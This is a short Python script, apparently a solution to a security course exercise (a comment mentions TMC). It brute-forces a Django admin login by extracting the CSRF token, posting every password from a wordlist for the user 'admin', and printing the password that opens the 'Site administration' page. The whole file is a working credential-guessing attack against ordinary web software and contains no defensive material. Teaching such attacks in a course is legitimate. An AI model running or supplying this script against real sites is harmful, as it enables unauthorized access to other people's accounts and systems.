import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	new_address = address + '/admin/login/?next=/admin/'
	s = requests.Session()
	response = s.get(new_address)
	token = extract_token(response)
	
	for password in candidates:
		req = s.post(new_address, data={'csrfmiddlewaretoken': token, 'username': 'admin', 'password': password})
		if isloggedin(req):
			return password

	return None



def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
